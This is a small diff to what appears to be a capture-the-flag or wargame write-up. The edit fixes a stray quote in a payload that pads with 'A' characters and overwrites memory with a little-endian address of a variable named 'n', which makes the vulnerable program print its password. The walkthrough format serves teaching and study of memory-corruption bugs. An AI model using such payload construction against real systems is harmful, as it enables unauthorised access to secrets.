@@ -33,7 +33,7 @@ We can try to override the second memory by `n`'s address:
 + "A" * 8
 
 # n's address in LE
-+ "\x54\x84\x04\x08"'
++ "\x54\x84\x04\x08"
 ```
 
 The program will `cat` the password for us, so no need to save the payload into a file, we can send it directly to the vulnerable program:
